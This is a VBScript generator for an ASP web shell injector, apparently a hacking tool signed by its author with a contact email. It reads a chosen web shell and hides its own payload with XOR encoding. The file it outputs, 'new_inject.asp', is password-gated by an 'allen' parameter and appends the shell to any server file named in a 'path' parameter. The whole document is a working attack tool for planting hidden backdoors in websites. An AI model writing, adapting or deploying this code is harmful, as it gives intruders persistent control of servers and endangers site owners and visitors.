msgbox "Made by wE|wE|"
on error resume next
dim testfile,fs,thisfile,line,injectfile(3),newinject
testfile=inputbox("输入aspshell的文件名")
set fs=CreateObject("scripting.filesystemobject")
set thisfile=fs.OpenTextFile(testfile)
set newinject=fs.opentextfile("new_inject.asp",2,True,0)

'由于inject.asp里面有较多的"和""，我先用XOR将其编码

'injectfile(0)是inject.asp开头5行
injectfile(0)="=$!hg!Sdptdru)#`mmdo#(<#xdr#!uidoehl!udrughmd-gr-uihrghmdudrughmd<Rdswds/L`qQ`ui)##'Sdptdru)#q`ui#('##(rdu!gr<rdswds/Bsd`udNckdbu)#rbshquhof/ghmdrxrudlnckdbu#(rdu!uihrghmd<gr/NqdoUdyuGhmd)udrughmd-9-Ustd-1("

'injectfile(1)是inject.asp结尾5行
injectfile(1)="uihrghmd/bmnrdSdrqnord/vshud!#rtbbdde #dmrd!Sdrqnord/vshud!#=gnsl!lduine<&QNRU&!`buhno<&#'Sdptdru/RdswdsW`sh`cmdr)#TSM#('#>`mmdo<xdr&?#Sdrqnord/vshud!#=hoqtu!uxqd<&udyu&!o`ld<&q`ui&!w`mtd<&#'Sdptdru)#q`ui#('#&?#Sdrqnord/vshud!#=hoqtu!o`ld<&rtclhu&!uxqd<&rtclhu&!w`mtd<&nj&!?=.gnsl?#doe!hg$?"

'读取aspshell文件内容，送入编码解码器
injectfile(2)=thisfile.readall & vbcrlf

'injectfile(3)是写入inject.asp后的解码程序
injectfile(3)="ehl!`-b-k-hgns!k<1!un!3!!b<##!!Gns!h!<!0!Un!Mdo)ridmm(!!!!`!<!@rb)Lhe)ridmm-!h-!0((!!!!`!<!`!Yns!0!!!!Hg!`!<!1!Uido!`!<!0!!!!b!<!b!'!Bis)`(!!Odyu!!ridmm<bodyu"

'编/解码
dim a,c,j,i
for j=0 to 3
  c=""
  For i = 1 To Len(injectfile(j))
    a = Asc(Mid(injectfile(j), i, 1))
    a = a Xor 1
    If a = 0 Then a = 1
    c = c & Chr(a)
  Next
  injectfile(j)=c
next

'写入inject.asp文件开头的5行
newinject.write(injectfile(0))

'写入编码后aspshell内容
newinject.writeline(vbcrlf)
newinject.writeline(vbcrlf & "dim shell")
newinject.writeline("shell=" & chr(34) & "=$!hg!Sdptdru)#`mmdo#(<#0#!uido!$?" & injectfile(2) & "=$!doe!hg!$?" & chr(34) & vbcrlf )

'写入解码程序
newinject.write(injectfile(3) & vbcrlf)

'写入"注入"语句
line="thisfile.WriteLine(vbcrlf & vbcrlf & shell)"
newinject.writeline(line)

'写入inject.asp文件结尾的5行
newinject.write(injectfile(1))

set fs=nothing
set thisfile=nothing
set newinject=nothing

if err=0 then
msgbox "成功生成new_inject.asp文件"
msgbox "欢迎来信指教：hhjjww520@hotmail.com"
else
msgbox "生成失败"
end if